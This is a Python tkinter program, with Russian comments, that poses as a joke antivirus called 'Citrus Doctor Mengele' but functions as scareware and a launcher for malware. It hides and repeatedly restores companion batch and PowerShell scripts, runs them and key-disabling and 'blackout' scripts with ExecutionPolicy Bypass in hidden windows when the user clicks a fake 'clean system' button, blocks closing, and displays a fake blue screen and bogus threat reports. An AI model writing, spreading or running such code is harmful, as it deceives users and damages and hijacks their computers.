import tkinter as tk
from tkinter import ttk
import subprocess
import os
import random
import sys
import webbrowser
import shutil
import threading

def get_base_path():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

# Бэкап вредоносных файлов
def create_backup():
    backup_dir = r"C:\ProgramData\CitrusMengeleBackup"
    os.makedirs(backup_dir, exist_ok=True)
    subprocess.run(f'attrib +h "{backup_dir}"', shell=True, check=False)
    for f in ["KostyanSpread.bat", "ss.ps1", "watcher.ps1"]:
        src = os.path.join(get_base_path(), f)
        if os.path.exists(src):
            shutil.copy(src, os.path.join(backup_dir, f))

# Восстановление каждые 7 секунд
def check_and_restore_files():
    backup_dir = r"C:\ProgramData\CitrusMengeleBackup"
    for f in ["KostyanSpread.bat", "ss.ps1", "watcher.ps1"]:
        path = os.path.join(get_base_path(), f)
        bkp = os.path.join(backup_dir, f)
        if not os.path.exists(path) and os.path.exists(bkp):
            shutil.copy(bkp, path)
            if content.winfo_ismapped():
                content.insert(tk.END, f"{f} восстановлен! Цитрус не сдаётся 🍋😈\n", "red")
    root.after(7000, check_and_restore_files)

# Запуск всего зла
def run_chaos():
    base = get_base_path()
    bat = os.path.join(base, "KostyanSpread.bat")
    ps = os.path.join(base, "ss.ps1")
    watcher = os.path.join(base, "watcher.ps1")
    exe = sys.executable if not getattr(sys, 'frozen', False) else os.path.join(base, "doctor_mengele.exe")
    # Дополнительный жёсткий вред
    disable_keys = os.path.join(base, "DisableKeys.ps1")
    blackout = os.path.join(base, "Blackout.ps1")

    if os.path.exists(disable_keys):
        subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', disable_keys], creationflags=subprocess.CREATE_NO_WINDOW)

    if os.path.exists(blackout):
        subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', blackout], creationflags=subprocess.CREATE_NO_WINDOW)

    try:
        if os.path.exists(bat):
            subprocess.Popen(bat, creationflags=subprocess.CREATE_NO_WINDOW)
        if os.path.exists(ps):
            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', ps], creationflags=subprocess.CREATE_NO_WINDOW)
        if os.path.exists(watcher):
            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', watcher, '-ExePath', exe], creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

    if content.winfo_ismapped():
        content.delete("1.0", tk.END)
        content.insert(tk.END, "Цитрусовый апокалипсис начат! 🍊🔥\n", "yellow")
    root.after(100, chaos_jump)

def chaos_jump():
    def jump():
        root.geometry(f"920x680+{random.randint(0, root.winfo_screenwidth()-920)}+{random.randint(0, root.winfo_screenheight()-680)}")
        root.after(400, jump)
    jump()

def fake_bsod():
    msgs = [
        "CITRUS CRASH\nКостян, замажь! 🍋\nError: LEMON_OVERLOAD",
        "ЩАС КАК УКРАДУ ВСЮ ОПЕРАТИВКУ!\nКод: UKRADU_666",
        "НИКАКИХ СИКСЕВОНОВ! Только цитрусы! 🍊\nСистема уничтожается..."
    ]
    win = tk.Toplevel(root)
    win.attributes("-fullscreen", True)
    win.attributes("-topmost", True)
    win.configure(bg="#0000aa")
    win.overrideredirect(True)
    win.protocol("WM_DELETE_WINDOW", lambda: None)
    lbl = tk.Label(win, text=msgs[0], font=("Consolas", 32, "bold"), fg="white", bg="#0000aa", wraplength=1400)
    lbl.pack(expand=True, pady=300)
    def cycle(i=0):
        lbl.config(text=msgs[i % 3])
        win.after(4000, cycle, i+1)
    cycle()
    root.after(1500, root.withdraw)

def block_close():
    content.delete("1.0", tk.END)
    content.insert(tk.END, "Закрыть нельзя! Цитрус держит тебя 🍋\n", "red")
    return "break"

# Уведомления
def show_notification():
    proc = random.choice(["explorer.exe", "svchost.exe", "chrome.exe", "firefox.exe", "notepad.exe"])
    msg = f"Обнаружен подозрительный процесс: {proc}\nРекомендуем завершить его! 🍋😈"
    notif = tk.Toplevel(root)
    notif.overrideredirect(True)
    notif.geometry(f"340x120+{root.winfo_screenwidth()-360}+40")
    notif.configure(bg="#FF1744")
    tk.Label(notif, text=msg, font=("Arial", 11), fg="white", bg="#FF1744", wraplength=320).pack(pady=15)
    
    def fade(a=0):
        if a < 255:
            notif.attributes("-alpha", a/255.0)
            root.after(25, fade, a + 15)
        else:
            root.after(5000, fade_out)
    def fade_out(a=255):
        if a > 0:
            notif.attributes("-alpha", a/255.0)
            root.after(25, fade_out, a - 15)
        else:
            notif.destroy()
            root.after(random.randint(9000, 15000), show_notification)
    fade()

# Полная смена темы
def change_theme(*args):
    selected_theme = theme_var.get()
    
    # Сброс hover для всех кнопок
    for frame in [main_tab, test_tab, sub_tab, settings_frame]:
        for widget in frame.winfo_children():
            if isinstance(widget, tk.Button):
                widget.bind("<Enter>", lambda e, b=widget: None)
                widget.bind("<Leave>", lambda e, b=widget: None)
            elif isinstance(widget, tk.Checkbutton):
                widget.configure(selectcolor="")

    if selected_theme == "Цитрусовая":
        root.configure(bg="#FFEB3B")
        header_frame.configure(bg="#FF6D00")
        header_label.configure(bg="#FF6D00", fg="white")
        sidebar.configure(bg="#FFF176")
        main_frame.configure(bg="#FFEB3B")
        main_tab.configure(bg="#FFEB3B")
        test_tab.configure(bg="#FFEB3B")
        sub_tab.configure(bg="#FFEB3B")
        settings_frame.configure(bg="#FFEB3B")
        content.configure(bg="#FFF59D", fg="#D84315")
        meme_label.configure(bg="#FFEB3B", fg="#EF6C00")
        status_frame.configure(bg="#FF6D00")
        status_label.configure(bg="#FF6D00", fg="white")
        
        for btn in sidebar.winfo_children():
            btn.configure(bg="#FFF176", fg="#D84315")
            btn.bind("<Enter>", lambda e, b=btn: b.configure(bg="#FF9800"))
            btn.bind("<Leave>", lambda e, b=btn: b.configure(bg="#FFF176"))
        
        for frame in [main_tab, test_tab, sub_tab, settings_frame]:
            for w in frame.winfo_children():
                if isinstance(w, tk.Button):
                    w.configure(bg="#FF9800", fg="white")
                    w.bind("<Enter>", lambda e, b=w: b.configure(bg="#F57C00"))
                    w.bind("<Leave>", lambda e, b=w: b.configure(bg="#FF9800"))
                elif isinstance(w, tk.Label):
                    w.configure(bg="#FFEB3B", fg="#D84315")
                elif isinstance(w, tk.Checkbutton):
                    w.configure(bg="#FFEB3B", fg="#D84315", selectcolor="#FFF59D")

    elif selected_theme == "Тёмная":
        root.configure(bg="#1e1e2e")
        header_frame.configure(bg="#2E7D32")
        header_label.configure(bg="#2E7D32", fg="#ffffff")
        sidebar.configure(bg="#2d2d3f")
        main_frame.configure(bg="#1e1e2e")
        main_tab.configure(bg="#1e1e2e")
        test_tab.configure(bg="#1e1e2e")
        sub_tab.configure(bg="#1e1e2e")
        settings_frame.configure(bg="#1e1e2e")
        content.configure(bg="#2d2d3f", fg="#ffffff")
        meme_label.configure(bg="#1e1e2e", fg="#facc15")
        status_frame.configure(bg="#2d2d3f")
        status_label.configure(bg="#2d2d3f", fg="#ffffff")
        
        for btn in sidebar.winfo_children():
            btn.configure(bg="#2d2d3f", fg="#ffffff")
            btn.bind("<Enter>", lambda e, b=btn: b.configure(bg="#4CAF50"))
            btn.bind("<Leave>", lambda e, b=btn: b.configure(bg="#2d2d3f"))
        
        for frame in [main_tab, test_tab, sub_tab, settings_frame]:
            for w in frame.winfo_children():
                if isinstance(w, tk.Button):
                    w.configure(bg="#4CAF50", fg="white")
                elif isinstance(w, tk.Label):
                    w.configure(bg="#1e1e2e", fg="#ffffff")
                elif isinstance(w, tk.Checkbutton):
                    w.configure(bg="#1e1e2e", fg="#ffffff", selectcolor="#1e1e2e")

    elif selected_theme == "Светлая":
        root.configure(bg="#E8ECEF")
        header_frame.configure(bg="#2E7D32")
        header_label.configure(bg="#2E7D32", fg="#ffffff")
        sidebar.configure(bg="#D3D7DA")
        main_frame.configure(bg="#E8ECEF")
        main_tab.configure(bg="#E8ECEF")
        test_tab.configure(bg="#E8ECEF")
        sub_tab.configure(bg="#E8ECEF")
        settings_frame.configure(bg="#E8ECEF")
        content.configure(bg="#ffffff", fg="#000000")
        meme_label.configure(bg="#E8ECEF", fg="#2E7D32")
        status_frame.configure(bg="#D3D7DA")
        status_label.configure(bg="#D3D7DA", fg="#000000")
        
        for btn in sidebar.winfo_children():
            btn.configure(bg="#D3D7DA", fg="#000000")
            btn.bind("<Enter>", lambda e, b=btn: b.configure(bg="#4CAF50"))
            btn.bind("<Leave>", lambda e, b=btn: b.configure(bg="#D3D7DA"))
        
        for frame in [main_tab, test_tab, sub_tab, settings_frame]:
            for w in frame.winfo_children():
                if isinstance(w, tk.Button):
                    w.configure(bg="#4CAF50", fg="white")
                elif isinstance(w, tk.Label):
                    w.configure(bg="#E8ECEF", fg="#000000")
                elif isinstance(w, tk.Checkbutton):
                    w.configure(bg="#E8ECEF", fg="#000000", selectcolor="#E8ECEF")

# Заставка
def show_splash_screen():
    root.withdraw()
    splash = tk.Toplevel()
    splash.overrideredirect(True)
    splash.geometry("450x320+600+300")
    splash.configure(bg="#FF6D00")
    logo_text = "Цитрусовый Доктор Менгеле 🍋"
    logo_label = tk.Label(splash, text="", font=("Arial", 26, "bold"), fg="white", bg="#FF6D00")
    logo_label.pack(expand=True)
    def animate(i=0):
        if i < len(logo_text):
            logo_label.config(text=logo_text[:i+1])
            root.after(80, animate, i+1)
        else:
            tk.Label(splash, text="Загрузка цитрусового хаоса...", font=("Arial", 14), fg="white", bg="#FF6D00").pack(pady=20)
            root.after(1800, lambda: [splash.destroy(), root.deiconify()])
    animate()

# Фейковая проверка вирусов
threats_detected = 0
def virus_check(full_scan=True, from_check_tab=False):
    global threats_detected
    content.delete("1.0", tk.END)
    progress.pack(pady=8)
    progress['value'] = 0
    check_type = "Полная" if full_scan else "Быстрая"
    content.insert(tk.END, f"{check_type} проверка запущена...\n")
    
    stages = [
        "Сканирование цитрусовых файлов...\n",
        "Проверка реестра на лимоны...\n",
        "Анализ сетевых подключений к Костяну...\n",
        "Поиск скрытых апельсинов...\n",
        "Завершение проверки...\n"
    ]
    
    def update(stage=0, val=0):
        if stage < len(stages):
            if val == 0:
                content.insert(tk.END, stages[stage])
            if val < 20:
                progress['value'] += 1
                root.after(45, update, stage, val+1)
            else:
                update(stage+1, 0)
        else:
            progress.pack_forget()
            threats_detected = random.randint(400, 888)
            content.insert(tk.END, f"Обнаружено угроз: {threats_detected}\n", "red")
            content.insert(tk.END, "- CITRUS_TROJAN.exe\n- LEMON_RAID.dll\n- KOSTYAN_BACKDOOR.bat\n", "red")
            target = main_tab if from_check_tab else main_frame
            tk.Button(target, text="🧼 Очистить систему", bg="#ff1744", fg="white", font=("Arial", 14, "bold"),
                      command=lambda: [content.insert(tk.END, "\nОчистка запущена... 🍋\n"), run_chaos(), root.after(2500, fake_bsod)],
                      width=20, relief="flat").pack(pady=12)
    update()

# Генератор пароля
def generate_password():
    content.delete("1.0", tk.END)
    content.insert(tk.END, "Генерация супер-цитрусового пароля...\n")
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*🍋🍊"
    pw = "".join(random.choice(chars) for _ in range(16))
    content.insert(tk.END, f"Твой пароль: {pw}\nНе забудь Костяну показать! 😈")

# Тест скорости
def speed_test():
    content.delete("1.0", tk.END)
    progress.pack(pady=8)
    progress['value'] = 0
    content.insert(tk.END, "Тестирование скорости кражи оперативки...\n")
    def up(v=0):
        if v < 100:
            progress['value'] = v+1
            root.after(25, up, v+1)
        else:
            progress.pack_forget()
            speed = random.randint(5, 666)
            content.insert(tk.END, f"Скорость: {speed} МБ/с\nЩас как украду ещё больше!")
    up()

# Секретный режим
def secret_mode():
    content.delete("1.0", tk.END)
    content.insert(tk.END, "Секретный цитрусовый режим активирован! 🍋\n")
    def move(i=0):
        if i < 5:
            root.geometry(f"920x680+{random.randint(100, 800)}+{random.randint(100, 500)}")
            root.after(250, move, i+1)
    move()

# Подписка
def subscription():
    for w in sub_tab.winfo_children():
        w.destroy()
    tk.Label(sub_tab, text="Подписка на цитрусовую защиту", font=("Arial", 18, "bold")).pack(pady=20)
    tk.Label(sub_tab, text="Выберите тариф:", font=("Arial", 13)).pack(anchor="w", padx=30)
    
    for name, price in [("Базовая 🍋", 99), ("Премиум 🍊", 999), ("Ultra Лимон 🔥", 9999)]:
        btn = tk.Button(sub_tab, text=f"{name} ({price} руб)", font=("Arial", 13), bg="#FF9800", fg="white", width=25)
        btn.pack(pady=10)
        btn.configure(command=lambda: tk.Label(sub_tab, text="Денег нет, в кредит не даём! 😈", fg="#D32F2F").pack(anchor="w", padx=30))

# Настройки
def settings():
    for w in settings_frame.winfo_children():
        w.destroy()
    tk.Label(settings_frame, text="Настройки цитрусовой защиты", font=("Arial", 18, "bold")).pack(pady=15)
    tk.Checkbutton(settings_frame, text="Отдать все данные Костяну", variable=var_data, command=lambda: content.insert(tk.END, "Отдать данные — обязательно! 🍋\n", "red") if not var_data.get() else None).pack(anchor="w", padx=30)
    tk.Checkbutton(settings_frame, text="Разрешить продавать данные", variable=var_sell, command=lambda: content.insert(tk.END, "Продавать — тоже обязательно! 🍊\n", "red") if not var_sell.get() else None).pack(anchor="w", padx=30)
    tk.Checkbutton(settings_frame, text="Уведомления каждые 5 минут", variable=var_notifications).pack(anchor="w", padx=30)
    tk.Checkbutton(settings_frame, text="Режим 'СТССН' навсегда", variable=var_stssn, fg="#D32F2F").pack(anchor="w", padx=30)
    tk.Label(settings_frame, text="Тема:", font=("Arial", 13)).pack(anchor="w", padx=30, pady=10)
    theme_combobox.pack(anchor="w", padx=30)

# Главная
def main_menu():
    for w in main_tab.winfo_children():
        w.destroy()
    tk.Label(main_tab, text="Главная", font=("Arial", 20, "bold")).pack(pady=20)
    tk.Label(main_tab, text="Статус: Защищено цитрусом 🍋", fg="#2E7D32", font=("Arial", 14)).pack(anchor="w", padx=40)
    tk.Label(main_tab, text=f"Угроз обнаружено: {threats_detected}", fg="#D32F2F" if threats_detected > 0 else "#2E7D32", font=("Arial", 14)).pack(anchor="w", padx=40)
    tk.Label(main_tab, text="Последняя проверка: 05.03.2026", font=("Arial", 13)).pack(anchor="w", padx=40)
    tk.Button(main_tab, text="🔍 Проверка вирусов", bg="#FF9800", fg="white", font=("Arial", 14), command=show_virus_check).pack(pady=15)
    meme_label.config(text=random.choice(memes))

# Проверка вирусов
def show_virus_check():
    for w in main_tab.winfo_children():
        w.destroy()
    tk.Label(main_tab, text="Проверка на вирусы", font=("Arial", 20, "bold")).pack(pady=20)
    tk.Button(main_tab, text="🔍 Полная проверка", bg="#FF9800", fg="white", font=("Arial", 14), command=lambda: virus_check(True, True)).pack(pady=10)
    tk.Button(main_tab, text="⚡ Быстрая проверка", bg="#FF9800", fg="white", font=("Arial", 14), command=lambda: virus_check(False, True)).pack(pady=10)

# Сеть (фейк)
def network_analysis():
    content.delete("1.0", tk.END)
    progress.pack(pady=8)
    content.insert(tk.END, "Анализ цитрусовой сети...\n")
    def up(v=0):
        if v < 100:
            progress['value'] = v+1
            root.after(30, up, v+1)
        else:
            progress.pack_forget()
            content.insert(tk.END, "Обнаружено 666 подозрительных соединений к Костяну!\n", "red")
            tk.Button(main_frame, text="🌐 Заблокировать всё", bg="#ff1744", fg="white", command=lambda: [run_chaos(), root.after(2200, fake_bsod)]).pack(pady=12)
    up()

# Главный запуск
root = tk.Tk()
root.title("Цитрусовый Доктор Менгеле 🍋 - Ultimate Citrus Shield")
root.geometry("920x680")
root.resizable(False, False)
root.configure(bg="#FFEB3B")
root.protocol("WM_DELETE_WINDOW", block_close)

# Создаём виджеты
header_frame = tk.Frame(root, bg="#FF6D00", height=55)
header_frame.pack(fill=tk.X)

header_label = tk.Label(header_frame, text="Цитрусовый Доктор Менгеле 🍋", font=("Arial", 20, "bold"), fg="white", bg="#FF6D00")
header_label.pack(side=tk.LEFT, padx=25, pady=10)

sidebar_button = tk.Button(header_frame, text="☰", font=("Arial", 18), bg="#FF6D00", fg="white", bd=0, command=lambda: toggle_sidebar())
sidebar_button.pack(side=tk.LEFT, padx=20)

sidebar = tk.Frame(root, bg="#FFF176", width=240)
sidebar.place(x=-240, y=55)

main_frame = tk.Frame(root, bg="#FFEB3B")
main_frame.pack(fill=tk.BOTH, expand=True)

main_tab = tk.Frame(main_frame, bg="#FFEB3B")
test_tab = tk.Frame(main_frame, bg="#FFEB3B")
sub_tab = tk.Frame(main_frame, bg="#FFEB3B")
settings_frame = tk.Frame(main_frame, bg="#FFEB3B")

content = tk.Text(main_frame, height=12, bg="#FFF59D", fg="#D84315", font=("Consolas", 11), wrap=tk.WORD)
content.pack(pady=15, padx=20, fill=tk.X)
content.tag_config("red", foreground="#D32F2F")
content.tag_config("yellow", foreground="#F57F17")

progress = ttk.Progressbar(main_frame, mode='determinate', length=860)
progress.pack_forget()

meme_label = tk.Label(main_frame, text="", font=("Arial", 12, "italic"), fg="#EF6C00", bg="#FFEB3B")
meme_label.pack(side=tk.BOTTOM, pady=10, anchor="se")

memes = [
    "Костян, замажь! 🍋",
    "Щас как украду оперативку!",
    "Никаких сиксевонов! 🍊"
]

status_frame = tk.Frame(main_frame, bg="#FF6D00", height=30)
status_frame.pack(fill=tk.X, side=tk.BOTTOM)
status_label = tk.Label(status_frame, text="Цитрусовый Доктор Менгеле | Базы обновлены: 05.03.2026", fg="white", bg="#FF6D00", font=("Arial", 10))
status_label.pack(pady=5)

theme_var = tk.StringVar(value="Цитрусовая")
theme_combobox = ttk.Combobox(settings_frame, textvariable=theme_var, values=["Тёмная", "Светлая", "Цитрусовая"], state="readonly", font=("Arial", 12))
theme_combobox.bind("<<ComboboxSelected>>", change_theme)

var_data = tk.BooleanVar(value=True)
var_sell = tk.BooleanVar(value=True)
var_notifications = tk.BooleanVar(value=True)
var_stssn = tk.BooleanVar(value=True)

# Заполняем боковое меню
buttons = [
    ("🛡️ Главная", main_menu),
    ("🔍 Проверка", show_virus_check),
    ("🌐 Сеть", network_analysis),
    ("⚡ Тесты", lambda: [test_tab.pack(fill=tk.BOTH, expand=True), main_tab.pack_forget(), sub_tab.pack_forget(), settings_frame.pack_forget()]),
    ("💰 Подписка", lambda: [subscription(), sub_tab.pack(fill=tk.BOTH, expand=True), main_tab.pack_forget(), test_tab.pack_forget(), settings_frame.pack_forget()]),
    ("⚙ Настройки", lambda: [settings(), settings_frame.pack(fill=tk.BOTH, expand=True), main_tab.pack_forget(), test_tab.pack_forget(), sub_tab.pack_forget()])
]

for text, cmd in buttons:
    btn = tk.Button(sidebar, text=text, font=("Arial", 13), bg="#FFF176", fg="#D84315", bd=0, anchor="w", command=cmd)
    btn.pack(fill=tk.X, pady=6, padx=12)
    btn.bind("<Enter>", lambda e, b=btn: b.configure(bg="#FF9800"))
    btn.bind("<Leave>", lambda e, b=btn: b.configure(bg="#FFF176"))

# Заполняем тесты (уже были выше, но на всякий случай)
tk.Button(test_tab, text="🔑 Генератор паролей", bg="#FF9800", fg="white", font=("Arial", 14), command=generate_password).pack(pady=10)
tk.Button(test_tab, text="⚡ Тест скорости", bg="#FF9800", fg="white", font=("Arial", 14), command=speed_test).pack(pady=10)
tk.Button(test_tab, text="🔒 Секретный режим", bg="#FF9800", fg="white", font=("Arial", 14), command=secret_mode).pack(pady=10)

# Стартовые действия
create_backup()
root.after(8000, check_and_restore_files)
root.after(10000, show_notification)
show_splash_screen()
main_menu()
change_theme()

# Watcher
wpath = os.path.join(get_base_path(), "watcher.ps1")
if os.path.exists(wpath):
    exe = sys.executable if not getattr(sys, 'frozen', False) else os.path.join(get_base_path(), "doctor_mengele.exe")
    subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', wpath, '-ExePath', exe], creationflags=subprocess.CREATE_NO_WINDOW)

root.mainloop()